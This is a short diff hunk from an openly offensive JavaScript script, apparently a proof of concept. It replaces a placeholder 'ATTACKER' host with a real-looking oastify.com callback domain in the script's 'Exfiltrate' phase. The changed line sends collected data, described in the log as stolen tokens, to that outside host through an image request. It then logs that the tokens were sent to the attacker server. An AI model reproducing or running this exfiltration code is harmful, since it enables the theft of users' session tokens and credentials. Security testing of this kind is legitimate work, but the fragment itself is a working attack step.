@@ -34,7 +34,7 @@ fetch(target)
 
     // Exfiltrate
     log("\nPhase 3: Exfiltrating...");
-    new Image().src = "https://ATTACKER/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
+    new Image().src = "https://e0fq16rugv703ei78jd5jrzw5nbez5nu.oastify.com/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
     log("DONE — tokens sent to attacker server");
   })
   .catch(function(e) {
